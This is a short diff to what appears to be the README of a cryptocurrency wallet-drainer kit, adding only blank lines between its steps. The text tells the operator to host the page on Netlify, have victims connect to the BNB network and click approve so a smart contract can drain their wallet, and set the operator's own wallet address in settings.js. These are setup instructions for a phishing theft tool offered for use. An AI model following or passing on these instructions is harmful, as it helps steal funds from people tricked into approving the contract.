@@ -4,8 +4,11 @@ go to https://www.netlify.com/ to host or host it on a regular site
 
 Steps
 1.first connect to bnb network
+
 2.Click approve
+
 3.Smart contract approves you to drain wallet
+
 4.Drain wallet
 
 To use all you have to do is put your wallet address in the settings.js file.
